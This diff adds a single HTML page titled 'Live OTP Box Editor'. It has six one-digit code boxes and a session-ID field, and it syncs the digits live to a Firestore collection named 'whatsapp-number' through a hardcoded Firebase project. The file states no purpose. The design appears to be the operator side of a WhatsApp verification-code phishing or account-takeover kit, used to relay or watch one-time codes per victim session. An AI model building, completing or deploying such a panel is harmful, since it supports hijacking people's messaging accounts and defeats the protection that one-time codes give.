@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Live OTP Box Editor</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f2f2f2;
+    }
+
+    h2 {
+      text-align: center;
+      color: #25d366;
+    }
+
+    .field {
+      margin-bottom: 15px;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    .otp-container {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 20px 0;
+    }
+
+    .otp-box {
+      width: 50px;
+      height: 60px;
+      font-size: 28px;
+      text-align: center;
+      border-radius: 10px;
+      border: 2px solid #ccc;
+    }
+
+    .message {
+      text-align: center;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Live OTP Box Editor</h2>
+
+  <div class="field">
+    <label>Enter Session ID:</label>
+    <input type="text" id="sessionId" placeholder="e.g. session-abc123" onblur="loadBoxes()">
+  </div>
+
+  <div class="otp-container">
+    <input class="otp-box" maxlength="1" id="box1" oninput="autoUpdate(1)" />
+    <input class="otp-box" maxlength="1" id="box2" oninput="autoUpdate(2)" />
+    <input class="otp-box" maxlength="1" id="box3" oninput="autoUpdate(3)" />
+    <input class="otp-box" maxlength="1" id="box4" oninput="autoUpdate(4)" />
+    <input class="otp-box" maxlength="1" id="box5" oninput="autoUpdate(5)" />
+    <input class="otp-box" maxlength="1" id="box6" oninput="autoUpdate(6)" />
+  </div>
+
+  <div class="message" id="status"></div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.appspot.com",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let currentSession = "";
+
+    function autoUpdate(boxNum) {
+      const sessionId = document.getElementById('sessionId').value.trim();
+      if (!sessionId) return;
+
+      const boxes = [];
+      for (let i = 1; i <= 6; i++) {
+        boxes.push(document.getElementById(`box${i}`).value.trim());
+      }
+
+      db.collection("whatsapp-number").doc(sessionId).update({ boxes })
+        .then(() => {
+          document.getElementById("status").textContent = "Box updated";
+          document.getElementById("status").style.color = "green";
+        })
+        .catch(err => {
+          document.getElementById("status").textContent = "Error: " + err.message;
+          document.getElementById("status").style.color = "red";
+        });
+    }
+
+    async function loadBoxes() {
+      const sessionId = document.getElementById('sessionId').value.trim();
+      if (!sessionId) return;
+
+      try {
+        const doc = await db.collection("whatsapp-number").doc(sessionId).get();
+        if (doc.exists) {
+          const data = doc.data();
+          if (data.boxes && Array.isArray(data.boxes)) {
+            data.boxes.forEach((val, idx) => {
+              const box = document.getElementById(`box${idx + 1}`);
+              if (box) box.value = val || '';
+            });
+          }
+        } else {
+          document.getElementById("status").textContent = "Session not found";
+          document.getElementById("status").style.color = "red";
+        }
+      } catch (err) {
+        document.getElementById("status").textContent = "Error: " + err.message;
+        document.getElementById("status").style.color = "red";
+      }
+    }
+  </script>
+</body>
+</html>
